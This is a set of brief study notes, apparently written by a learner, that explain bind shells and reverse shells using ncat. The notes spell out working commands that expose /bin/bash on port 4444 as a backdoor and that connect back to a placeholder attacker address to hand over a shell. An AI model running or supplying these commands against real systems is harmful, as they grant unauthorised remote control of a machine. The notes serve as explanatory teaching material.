Bind Shell = The target system binds a local shell to an open port and listens for an incoming connection.
Target (Victim): ncat -l -p 4444 -e /bin/bash (Hacker runs this open port secretly if someone connects to me, they can execute bash) - may call backdoor
Attacker: ncat <Target-IP> 4444 (Hacker connects to me on the present may be stuck on the firewall)

Reverse Shell
Attacker (Listens for incoming shell): ncat -l -p 4444 (Hacker opens port)
Target (Calls back to attacker): ncat <Attacker-IP> 4444 -e /bin/bash (Hacker runs this command he wants me to access his port. This method can ignore the firewall) - connect to his port and let him execute bash
